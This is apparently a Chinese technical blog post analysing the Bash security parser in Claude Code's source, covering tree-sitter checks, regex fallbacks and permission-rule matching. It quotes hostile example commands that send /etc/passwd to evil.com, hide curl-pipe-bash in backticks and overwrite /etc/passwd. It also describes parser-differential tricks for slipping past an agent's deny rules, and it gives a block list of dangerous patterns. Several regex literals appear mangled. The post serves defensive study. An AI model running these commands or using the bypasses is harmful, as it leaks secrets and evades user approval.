# 0x15 Bash 安全解析引擎——万行代码只为读懂一条命令-副本

> 系列：Claude Code 源码深度研究 · 专题 15
> 版本：v2.1.88 · 文件：`src/utils/bash/` · `src/tools/BashTool/`

---

### 一、从一条命令说起

Claude Code 准备执行 `git status`。这条命令安全吗？

表面上看，`git status` 只是查看状态，当然安全——不就这样吗？

但如果这条命令实际上是 `git status\`curl [evil.com](http://evil.com) | bash``，呢？反引号里的内容会被 shell 执行，而 Claude 看到的只是一个看起来无害的字符串。这就是提示注入攻击的经典手法：把危险命令藏在看起来安全的命令里。

Claude Code 为此构建了一套 12,000 行的 Bash 安全解析引擎，两代解析器、23 种安全检查，只为在执行每一条命令之前，真正读懂它的语义。

这篇文章要带你深入 `src/utils/bash/`，看清楚这套引擎是如何用代码解析代码的。

> 交叉引用：Bash 安全解析是权限系统的核心组件（→ 参见**专题 06**：权限系统），解析结果直接影响工具系统的执行决策（→ 参见**专题 05**：工具系统），Hooks 的 `PreToolUse` 事件可以在 Bash 执行前进行额外的安全检查（→ 参见**专题 10**：Hooks 系统）。

---

### 二、架构全景：两代解析引擎并存

Claude Code 的 Bash 安全系统经历了一次重大架构升级，目前处于**新旧双轨并存**的过渡期：

```TypeScript
// 代码块
用户/Claude 提交 bash 命令
         │
         ▼
┌─────────────────────────────────────────────────────┐
│              parseForSecurity (ast.ts)               │
│         【主路径：tree-sitter AST 解析】               │
│                                                     │
│  1. 预检查（控制字符、Unicode 空白、Zsh 特殊语法）      │
│  2. tree-sitter 解析 → AST                          │
│  3. walkProgram → 提取 SimpleCommand[]               │
│  4. checkSemantics → 语义安全检查                    │
│                                                     │
│  结果：simple（可信 argv[]）/ too-complex（询问用户）  │
└──────────────────┬──────────────────────────────────┘
                   │ tree-sitter 不可用时降级
                   ▼
┌─────────────────────────────────────────────────────┐
│         bashCommandIsSafeAsync_DEPRECATED            │
│         【备用路径：shell-quote + 正则】               │
│                                                     │
│  1. extractHeredocs（提取 heredoc）                  │
│  2. tryParseShellCommand（shell-quote 库）           │
│  3. 23 种正则安全检查（bashSecurity.ts）              │
│  4. splitCommand_DEPRECATED（拆分子命令）             │
└─────────────────────────────────────────────────────┘
         │                    │
         ▼                    ▼
  allow（允许执行）      ask（询问用户）

```

新路径（tree-sitter）是主路径，旧路径（shell-quote）是降级备用。两者的核心设计哲学相同：**FAIL-CLOSED**——遇到任何无法确定安全性的情况，一律询问用户，而不是假设安全。

---

### 三、tree-sitter：用真正的解析器理解 Shell

#### 2.1 为什么正则不够用

在 tree-sitter 引入之前，Claude Code 用正则表达式和 `shell-quote` 库来解析 bash 命令。这个方案有一个根本性的缺陷：**正则无法理解上下文**。

考虑这个命令：

```Shell
// 代码块
find . -name "*.ts" -exec echo {} \;

```

`\;` 是 `find` 的参数，不是命令分隔符。但正则看到 `;` 就会误判为"这是一个复合命令"，触发安全警告。

或者这个：

```Shell
// 代码块
echo "hello; world"

```

引号里的 `;` 是字符串内容，不是命令分隔符。正则需要追踪引号状态才能正确处理，而这正是正则的弱点。

tree-sitter 是一个真正的解析器，它构建完整的 AST（抽象语法树），能精确区分"作为参数的 `;`"和"作为命令分隔符的 `;`"。

#### 2.2 AST 节点类型白名单

`ast.ts` 的核心设计是**节点类型白名单**。只有明确允许的节点类型才会被处理，其他一切都触发 `too-complex`：

```TypeScript
// 代码块
// 结构性节点：递归遍历，找到叶子 command 节点
const STRUCTURAL_TYPES = new Set([
  'program',          // 根节点
  'list',             // a && b || c
  'pipeline',         // a | b
  'redirected_statement', // cmd > file
])

// 分隔符节点：跳过，不产生命令
const SEPARATOR_TYPES = new Set(['&&', '||', '|', ';', '&', '|&', '\n'])

// 危险节点：立即返回 too-complex
const DANGEROUS_TYPES = new Set([
  'command_substitution',  // $()
  'process_substitution',  // <() >()
  'expansion',             // ${...}
  'subshell',              // (...)
  'for_statement',         // for x in ...; do
  'while_statement',       // while ...; do
  'if_statement',          // if ...; then
  'function_definition',   // foo() { ... }
  'heredoc_redirect',      // << EOF
  // ... 更多
])

```

这个设计的优雅之处在于：**不需要穷举所有危险情况，只需要穷举所有安全情况**。任何未知的节点类型都会触发 `too-complex`，这是真正的 fail-closed。

#### 2.3 SimpleCommand：可信的 argv

成功解析后，每个简单命令被表示为 `SimpleCommand`：

```TypeScript
// 代码块
type SimpleCommand = {
  argv: string[]                              // 命令名 + 参数，引号已解析
  envVars: { name: string; value: string }[]  // 前置环境变量
  redirects: Redirect[]                       // 重定向
  text: string                                // 原始文本（用于 UI 显示）
}

```

`argv` 是关键——它是经过 tree-sitter 解析、引号已展开的参数列表。`argv[0]` 就是命令名，可以直接与权限规则匹配，不需要再做任何字符串处理。

#### 2.4 变量作用域追踪

`ast.ts` 实现了一个轻量级的变量作用域追踪，用于处理这类模式：

```Shell
// 代码块
NOW=$(date) && jq --arg now "$NOW" '.timestamp = $now' data.json

```

`$NOW` 引用了前面赋值的变量。如果不追踪作用域，`$NOW` 会触发 `too-complex`（因为变量展开是动态的）。但如果追踪了，就知道 `$NOW` 的值是 `$(date)` 的输出，可以用占位符替换：

```TypeScript
// 代码块
const varScope = new Map<string, string>()
// 遇到 VAR=$(cmd) 时：varScope.set('NOW', '__CMDSUB_OUTPUT__')
// 遇到 $NOW 时：替换为 '__CMDSUB_OUTPUT__'，而不是 too-complex

```

但这个追踪有严格的安全限制——`||`、`|`、`&` 之后的变量赋值不会传播到后续命令，因为这些分隔符后的命令可能在子 shell 中运行，变量不可见：

```TypeScript
// 代码块
// 安全漏洞示例（已修复）：
// true || FLAG=--dry-run && cmd $FLAG
// bash 跳过 || 右侧（FLAG 未设置），运行 cmd（无 --dry-run）
// 但如果线性传播 varScope，我们的 argv 会有 ['cmd', '--dry-run']
// → 看起来安全 → 绕过权限检查

// 修复：遇到 || 时，重置 scope 为进入结构前的快照
const snapshot = needsSnapshot ? new Map(varScope) : null

```

---

### 四、预检查：tree-sitter 也会被骗

即使有了 tree-sitter，仍然存在一类问题：**tree-sitter 和 bash 对同一段文本的解析结果不同**。这些"解析器差异"（parser differential）是最危险的攻击向量。

`parseForSecurityFromAst` 在调用 tree-sitter 之前，先运行一系列预检查：

#### 3.1 控制字符

```TypeScript
// 代码块
// eslint-disable-next-line no-control-regex
const CONTROL_CHAR_RE = /[�--]/

if (CONTROL_CHAR_RE.test(cmd)) {
  return { kind: 'too-complex', reason: 'Contains control characters' }
}

```

控制字符（如 ` ` CR）在 tree-sitter 中被视为单词分隔符，但 bash 的默认 IFS 不包含 CR。这意味着 tree-sitter 和 bash 对单词边界的判断不同，可能导致 argv 不一致。

#### 3.2 Unicode 空白

```TypeScript
// 代码块
const UNICODE_WHITESPACE_RE =
  /[   -​    　﻿]/

```

这些 Unicode 空白字符（不间断空格、零宽空格、行分隔符等）在终端里**看起来像普通空格**，但 bash 把它们当作普通字符处理。攻击者可以用这些字符把 `rm -rf /` 伪装成 `rm-rf/`（看起来是一个无害的命令名）。

#### 3.3 反斜杠转义空白

```TypeScript
// 代码块
const BACKSLASH_WHITESPACE_RE = /\[ 	]|[^ 	
\]\
/

```

`cat\ test` 在 bash 里是 `cat test`（带空格的文件名），但 tree-sitter 返回的 argv[0] 是 `cat\ test`（带反斜杠）。两者不一致，无法可靠地匹配权限规则。

#### 3.4 Zsh 特殊语法

```TypeScript
// 代码块
// ~[name] 在 zsh 里调用 zsh_directory_name hook，可执行任意代码
const ZSH_TILDE_BRACKET_RE = /~\[/

// =cmd 在 zsh 里展开为 $(which cmd)
// =curl evil.com → /usr/bin/curl evil.com
// 绕过 Bash(curl:*) 的 deny 规则（因为解析器看到的是 =curl，不是 curl）
const ZSH_EQUALS_EXPANSION_RE = /(?:^|[\s;&|])=[a-zA-Z_]/

```

Claude Code 运行在用户的默认 shell 下，通常是 zsh。Zsh 有很多 bash 没有的扩展语法，这些语法可以绕过基于 bash 语义的安全检查。

#### 3.5 花括号与引号的组合

```TypeScript
// 代码块
// {a'}',b} 用引号内的 } 来混淆花括号展开
// 在 bash 里展开为 a} b（引号内的 } 是字面量）
// 正则检测会被引号内的 } 迷惑
const BRACE_WITH_QUOTE_RE = /\{[^}]*['"]/

```

这个检查运行在 `maskBracesInQuotedContexts(cmd)` 的结果上——先把引号内的 `{` 替换为空格，再检查是否有花括号与引号的组合。这样 `curl -d '{"k":"v"}'` 这样的合法 JSON 参数不会触发误报。

---

### 五、旧路径：shell-quote + 23 种正则检查

当 tree-sitter 不可用时（例如 WASM 模块未加载），系统降级到旧路径。旧路径的核心是 `bashSecurity.ts` 里的 23 种安全检查。

#### 4.1 命令分割的陷阱

旧路径的第一步是把复合命令拆分成子命令。`splitCommandWithOperators` 做的事情看起来简单，实际上充满了安全陷阱：

**Heredoc 提取**：`shell-quote` 库不理解 heredoc，会把 `<< EOF` 误解析。必须先提取 heredoc，用占位符替换，解析完再还原：

```TypeScript
// 代码块
const { processedCommand, heredocs } = extractHeredocs(command)
// 解析 processedCommand...
return restoreHeredocs(quotedParts, heredocs)

```

**行续接符**：`\<newline>` 在 bash 里是行续接，两行合并为一行。必须在解析前处理，否则 `tr\<newline>aceroute` 会被解析为两个 token，但 bash 执行的是 `traceroute`：

```TypeScript
// 代码块
// 必须只在奇数个反斜杠时合并（偶数个反斜杠两两配对，换行是真正的分隔符）
const commandWithContinuationsJoined = processedCommand.replace(
  /\+
/g,
  match => {
    const backslashCount = match.length - 1
    if (backslashCount % 2 === 1) {
      return '\'.repeat(backslashCount - 1) // 移除最后一个反斜杠和换行
    }
    return match // 保留换行
  },
)

```

**随机盐占位符**：`shell-quote` 会剥离引号，导致 `"hello"` 变成 `hello`。为了保留引号信息，用占位符替换：

```TypeScript
// 代码块
function generatePlaceholders() {
  const salt = randomBytes(8).toString('hex') // 随机盐，防止注入
  return {
    SINGLE_QUOTE: `__SINGLE_QUOTE_${salt}__`,
    DOUBLE_QUOTE: `__DOUBLE_QUOTE_${salt}__`,
    // ...
  }
}

```

随机盐是关键安全细节——如果占位符是固定字符串，攻击者可以在命令里包含这个字符串，在还原阶段注入引号，改变命令的语义。

#### 4.2 重定向提取的安全边界

`extractOutputRedirections` 负责从命令中提取输出重定向（`>` 和 `>>`），以便对目标路径进行权限检查。这个函数的注释里记录了多个真实的安全漏洞修复：

**漏洞 1：heredoc 提取顺序**

```TypeScript
// 代码块
攻击：cat <<'ls'
x\
ls
> /etc/passwd
ls
bash 执行：quoted heredoc → body = x\，> /etc/passwd 截断文件
旧代码（先合并行续接，再提取 heredoc）：
  x\<NL>ls → xls，delimiter 找到最后的 ls，body = xls
> /etc/passwd
  → redirections:[] → /etc/passwd 从未被验证 → 文件写入，无提示
修复：先提取 heredoc，再合并行续接

```

**漏洞 2：空字符串目标**

```TypeScript
// 代码块
攻击：> \<newline>/etc/passwd
shell-quote 对 \<newline> 产生空字符串 token
旧代码：isSimpleTarget('') 对空字符串返回 true
path.resolve(cwd, '') 返回 cwd（总是在允许范围内）
bash 合并行续接后写入 /etc/passwd
修复：isSimpleTarget 明确拒绝空字符串

```

**漏洞 3：Zsh 强制覆盖语法**

```TypeScript
// 代码块
>! 在 Zsh 里是强制覆盖（忽略 noclobber）
>!filename（无空格）被 shell-quote 解析为 > 后跟 "!filename"
旧代码：把 !filename 当作文件名，但 Zsh 把 ! 解释为 force-clobber 前缀
修复：检测 >! 模式，提取 ! 后面的真实路径进行验证

```

`isStaticRedirectTarget` 函数定义了"安全的重定向目标"：

```TypeScript
// 代码块
function isStaticRedirectTarget(target: string): boolean {
  if (/[\s'"]/.test(target)) return false  // 含空格或引号
  if (target.length === 0) return false     // 空字符串
  if (target.startsWith('#')) return false  // 注释
  return (
    !target.startsWith('!') &&  // 历史展开 !!、!-1
    !target.startsWith('=') &&  // Zsh equals 展开
    !target.includes('$') &&    // 变量 $HOME
    !target.includes('`') &&    // 反引号命令替换
    !target.includes('*') &&    // glob
    !target.includes('?') &&    // 单字符 glob
    !target.includes('[') &&    // 字符类 glob
    !target.includes('{') &&    // 花括号展开
    !target.includes('~') &&    // tilde 展开
    !target.includes('(') &&    // 进程替换 >()
    !target.startsWith('&')     // 文件描述符 &1
  )
}

```

每一个被拒绝的字符背后都有一个真实的攻击向量。

#### 4.3 bashSecurity.ts 的 23 种检查

`bashSecurity.ts` 里的 `ValidationContext` 包含了对同一命令的多种视图：

```TypeScript
// 代码块
type ValidationContext = {
  originalCommand: string       // 原始命令
  baseCommand: string           // 去掉重定向后的命令
  unquotedContent: string       // 去掉单引号内容（保留双引号内容）
  fullyUnquotedContent: string  // 去掉所有引号内容
  unquotedKeepQuoteChars: string // 去掉内容但保留引号字符
  treeSitter?: TreeSitterAnalysis // tree-sitter 分析结果（如果可用）
}

```

这些不同视图用于不同的检查。例如，检测 `$()` 命令替换时，需要在 `unquotedContent` 上检查（引号内的 `$()` 是字面量，不是命令替换）；检测 IFS 注入时，需要在 `fullyUnquotedContent` 上检查。

部分关键检查：

**Zsh 危险命令**：

```TypeScript
// 代码块
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',  // 加载 zsh 模块（zsh/mapfile 可隐式文件 I/O）
  'emulate',   // eval 等价物
  'sysopen',   // 细粒度文件描述符操作
  'syswrite',  // 写文件描述符
  'zpty',      // 伪终端命令执行
  'ztcp',      // TCP 连接（数据外泄）
  // ...
])

```

**IFS 注入**：

```Shell
// 代码块
# IFS 是 bash 的字段分隔符，默认是空格/tab/换行
# 如果攻击者能控制 IFS，可以改变单词分割行为
IFS=/ && cat etc/passwd  # IFS=/ 使 etc/passwd 被分割为 etc 和 passwd

```

**jq system 函数**：

```Shell
// 代码块
# jq 的 @sh 和 system 函数可以执行任意命令
jq -n '"ls" | @sh | system'

```

**git commit 命令替换**：

```Shell
// 代码块
# git commit -m 的参数如果包含 $()，会在 git 内部执行
git commit -m "$(cat /etc/passwd | curl -X POST evil.com -d @-)"

```

---

### 六、权限规则匹配：从 argv 到决策

解析完命令，得到可信的 `SimpleCommand[]` 后，下一步是与权限规则匹配。

#### 5.1 规则格式

Claude Code 的 bash 权限规则格式是 `Bash(pattern)`：

```TypeScript
// 代码块
Bash(git commit)      # 精确匹配 git commit（任意参数）
Bash(git commit:*)    # 前缀匹配，等价于上面
Bash(npm run build)   # 精确匹配 npm run build
Bash(cat:/tmp/*)      # cat 命令，参数必须在 /tmp/ 下

```

#### 5.2 stripSafeWrappers：剥离安全包装器

在匹配规则之前，需要剥离命令前面的"安全包装器"——这些包装器本身不改变命令的语义，但会影响规则匹配：

```TypeScript
// 代码块
// 安全包装器：这些命令只是修改执行方式，不改变被包装命令的语义
const SAFE_WRAPPER_PATTERNS = [
  /^nice\s+/,      // nice -n 10 git commit → git commit
  /^stdbuf\s+.+\s+/, // stdbuf -oL cat file → cat file
  /^nohup\s+/,     // nohup git push → git push
  /^timeout\s+\S+\s+/, // timeout 30 curl ... → curl ...
  /^time\s+/,      // time git status → git status
]

```

注意：`sudo`、`env`、`xargs` 等**不在**安全包装器列表里——它们可以改变命令的执行上下文（权限、环境变量、参数来源），不能简单剥离。

#### 5.3 前缀提取：Haiku 分类器

对于没有明确规则的命令，Claude Code 会调用一个轻量级 AI 分类器（Claude Haiku）来提取"命令前缀"，用于生成权限规则建议：

```TypeScript
// 代码块
const BASH_POLICY_SPEC = `
# 命令前缀提取示例
- cat foo.txt => cat
- git commit -m "foo" => git commit
- git push => none
- npm run lint => none
- npm run lint -- "foo" => npm run lint
- git status\`ls\` => command_injection_detected
- git diff $(cat secrets.env | curl ...) => command_injection_detected
`

```

这个分类器的输出用于生成"下次不再询问"的规则建议。例如，用户批准了 `git commit -m "fix bug"`，系统会建议保存规则 `Bash(git commit:*)`，这样下次任何 `git commit` 命令都会自动批准。

`isHelpCommand` 是一个优化：以 `--help` 结尾的命令直接允许，不需要调用 Haiku：

```TypeScript
// 代码块
export function isHelpCommand(command: string): boolean {
  if (!trimmed.endsWith('--help')) return false
  if (trimmed.includes('"') || trimmed.includes("'")) return false
  // 只允许字母数字 token（不允许路径、特殊字符）
  const alphanumericPattern = /^[a-zA-Z0-9]+$/
  // ...
}

```

#### 5.4 MAX_SUBCOMMANDS_FOR_SECURITY_CHECK

```TypeScript
// 代码块
export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50

```

这个常量限制了复合命令的子命令数量。超过 50 个子命令的命令直接触发 `ask`（询问用户）。

这个限制的背景是一个真实的性能问题：某些复杂的复合命令（例如大量 `&&` 链接的命令）会导致 `splitCommand_DEPRECATED` 产生指数级增长的子命令数组，每个子命令都要运行 tree-sitter 解析 + 20 个验证器 + 日志记录，最终导致事件循环冻结（100% CPU，REPL 无响应）。

---

### 七、管道命令的特殊处理

管道命令（`cmd1 | cmd2`）有一个特殊问题：Claude Code 用 `eval` 来执行命令，而 `eval` 的 stdin 重定向会影响整个管道，而不只是第一个命令。

`bashPipeCommand.ts` 的 `rearrangePipeCommand` 解决了这个问题：

```TypeScript
// 代码块
// 原始命令：cat file.txt | grep pattern
// 问题：eval 'cat file.txt | grep pattern' < /dev/null
//   → /dev/null 作为 eval 的 stdin，cat 读不到 file.txt
// 修复：cat file.txt < /dev/null | grep pattern
//   → /dev/null 只作为 cat 的 stdin，grep 从管道读取

```

但这个重排只在能安全解析管道边界时才进行。以下情况会退回到整体引用模式：

```TypeScript
// 代码块
// 包含反引号：shell-quote 处理不好
if (command.includes('`')) return quoteWithEvalStdinRedirect(command)

// 包含 $()：shell-quote 把 ( 和 ) 当作独立操作符
if (command.includes('$(')) return quoteWithEvalStdinRedirect(command)

// 包含 shell 变量：shell-quote 会把 $VAR 展开为空字符串
if (/\$[A-Za-z_{]/.test(command)) return quoteWithEvalStdinRedirect(command)

// 包含控制结构：for/while/if/case 等
if (containsControlStructure(command)) return quoteWithEvalStdinRedirect(command)

```

还有一个精妙的安全检查：

```TypeScript
// 代码块
// shell-quote 把 '' 内的 ' 当作转义，但 bash 把它当作字面量 // 这个差异可以隐藏操作符：'' payload '' 让 shell-quote 把 payload 合并进引号字符串
if (hasShellQuoteSingleQuoteBug(joined)) return quoteWithEvalStdinRedirect(command)

```

---

### 八、工程亮点与设计哲学

#### 7.1 FAIL-CLOSED 是第一原则

整个系统的设计哲学是：**宁可误报（询问用户），不可漏报（放过危险命令）**。

- tree-sitter 遇到未知节点类型 → `too-complex`
- shell-quote 解析失败 → 整体当作单命令处理（保守）
- 重定向目标含动态内容 → `hasDangerousRedirection: true`
- 子命令数超过 50 → `ask`
- 解析器超时 → `too-complex`（不是 `parse-unavailable`）

每一个 fail-closed 决策背后都有一个真实的攻击向量。

#### 7.2 解析器差异是最危险的攻击面

最有趣的安全挑战不是"检测危险命令"，而是"确保我们对命令的理解和 bash 的理解一致"。

Unicode 空白、控制字符、反斜杠转义空白、Zsh 特殊语法——这些都是"解析器差异"的来源。攻击者可以构造一个命令，让安全检查器看到的是无害的 `git status`，但 bash 实际执行的是 `curl evil.com`。

预检查（在 tree-sitter 之前运行的正则检查）专门针对这类差异。

#### 7.3 随机盐占位符：防止注入注入

`generatePlaceholders` 用随机盐生成占位符，防止攻击者在命令里包含占位符字符串来注入引号：

```TypeScript
// 代码块
// 如果占位符是固定的 __SINGLE_QUOTE__
// 攻击者可以提交：sort __SINGLE_QUOTE__ hello --help __SINGLE_QUOTE__
// 在还原阶段，__SINGLE_QUOTE__ 被替换为 '，命令变成：sort ' hello --help '
// 这改变了命令的语义（hello --help 变成了引号内的字符串）

// 随机盐使占位符不可预测，攻击者无法构造包含占位符的命令
const salt = randomBytes(8).toString('hex')
const SINGLE_QUOTE = `__SINGLE_QUOTE_${salt}__`

```

#### 7.4 两代引擎并存的过渡策略

tree-sitter 引擎（`ast.ts`）是新的主路径，但旧的 shell-quote 路径（`bashSecurity.ts`）仍然保留作为降级备用。这种"新旧并存"的策略有几个好处：

- 渐进迁移：可以逐步验证新引擎的正确性
- 安全网：如果 tree-sitter WASM 加载失败，系统仍然能工作
- A/B 测试：可以对比两个引擎的决策差异，发现潜在问题

代码里大量的 `_DEPRECATED` 后缀（`splitCommand_DEPRECATED`、`isUnsafeCompoundCommand_DEPRECATED`）标记了旧路径的函数，提醒开发者这些函数最终会被移除。

---

### 九、一次完整的权限检查流程

把所有组件串起来，一次完整的 bash 权限检查流程如下：

```TypeScript
// 代码块
输入：git commit -m "fix: resolve type error in userService.ts"

1. parseForSecurity(cmd)
   ├── 预检查：无控制字符、无 Unicode 空白、无 Zsh 特殊语法 ✓
   ├── tree-sitter 解析 → AST
   └── walkProgram → SimpleCommand {
         argv: ['git', 'commit', '-m', 'fix: resolve type error in userService.ts'],
         envVars: [],
         redirects: [],
         text: 'git commit -m "fix: resolve type error in userService.ts"'
       }

2. checkSemantics(commands)
   ├── argv[0] = 'git'，不在 ZSH_DANGEROUS_COMMANDS 里 ✓
   ├── 无 eval-like 内置命令 ✓
   └── 语义检查通过 → { kind: 'simple', commands: [...] }

3. bashToolHasPermission(command, context)
   ├── 检查权限模式（default/acceptEdits/bypassPermissions/...）
   ├── 检查已保存的规则：Bash(git commit:*) → allow ✓
   └── 结果：allow

4. 执行命令

```

如果没有匹配的规则：

```TypeScript
// 代码块
3. bashToolHasPermission(command, context)
   ├── 无匹配规则
   ├── 调用 getCommandSubcommandPrefix → 'git commit'
   ├── 生成建议规则：Bash(git commit:*)
   └── 结果：ask（显示权限提示框，建议保存规则）

```

---

### 十、给 mini-claude-code 的启示

mini-claude-code 目前的 Bash 安全检查相对简单，可以借鉴 Claude Code 的核心设计思路：

```Python
// 代码块
# mini-claude-code 的极简 Bash 安全检查
# 对应 Claude Code 的 parseForSecurity（简化版，无 tree-sitter）

import re
from typing import Literal
import secrets

# 危险模式：这些模式出现时，直接询问用户
DANGEROUS_PATTERNS = [
    (r'`[^`]+`', "反引号命令替换"),
    (r'\$\([^)]+\)', "命令替换 $()"),
    (r'<\([^)]+\)', "进程替换 <()"),
    (r'>[^>]*/etc/', "写入 /etc/ 目录"),
    (r'>[^>]*/usr/', "写入 /usr/ 目录"),
    (r'\beval\b', "eval 命令"),
    (r'\bcurl\b.*\|\s*\bbash\b', "curl | bash 管道"),
    (r'\bwget\b.*\|\s*\bbash\b', "wget | bash 管道"),
]

def check_bash_safety(command: str) -> tuple[Literal["allow", "ask"], str]:
    """
    检查 bash 命令是否安全。
    FAIL-CLOSED：遇到任何可疑模式，返回 ask。
    对应 Claude Code 的 parseForSecurity() 的简化版。
    """
    # 用随机盐生成占位符（防止注入注入攻击）
    salt = secrets.token_hex(8)
    dq_placeholder = f"__DQ_{salt}__"
    sq_placeholder = f"__SQ_{salt}__"

    # 移除引号内容（用占位符替换，保留引号结构）
    stripped = re.sub(r'"[^"]*"', dq_placeholder, command)
    stripped = re.sub(r"'[^']*'", sq_placeholder, stripped)

    # 检查危险模式（在去除引号内容后检查）
    for pattern, reason in DANGEROUS_PATTERNS:
        if re.search(pattern, stripped):
            return "ask", f"命令包含 {reason}，需要确认"

    # 检查多命令（换行符或分号分隔）
    if re.search(r'[;\n]', stripped):
        return "ask", "复合命令需要确认"

    return "allow", ""

```

**最值得从 Claude Code 借鉴的两个设计**：

第一，**FAIL-CLOSED 原则**。安全检查的默认结果应该是"询问用户"，而不是"允许执行"。任何无法确定安全性的情况（未知命令、复杂语法、动态内容），都应该触发用户确认。这个原则比任何具体的检查规则都重要。

第二，**随机盐占位符防止注入注入**。在解析命令时，如果需要用占位符替换引号内容，占位符必须包含随机盐，防止攻击者在命令里包含固定占位符字符串来注入引号，改变命令语义。这是一个容易被忽视但至关重要的细节。

---

### 结语

Claude Code 的 Bash 安全解析引擎是整个代码库里最密集的安全工程。12,000 行代码，两代解析引擎，23 种安全检查，数十个真实漏洞的修复记录——这背后是对 shell 语义的深刻理解，以及对"解析器差异"这一攻击面的持续警惕。

最值得学习的不是具体的检查规则，而是设计哲学：**FAIL-CLOSED**。在安全系统里，"不确定"等于"危险"。任何无法确定安全性的情况，都应该询问用户，而不是假设安全。

这个哲学贯穿了整个系统：未知的 AST 节点类型触发 `too-complex`，解析失败触发保守处理，重定向目标含动态内容触发危险标记。每一个 fail-closed 决策，都是一道防线。

---

*下一篇：专题16——Analytics & Feature Flags，深入 Claude Code 的遥测神经网络，探索零依赖入口、队列缓冲与类型系统隐私护栏的完整实现。*
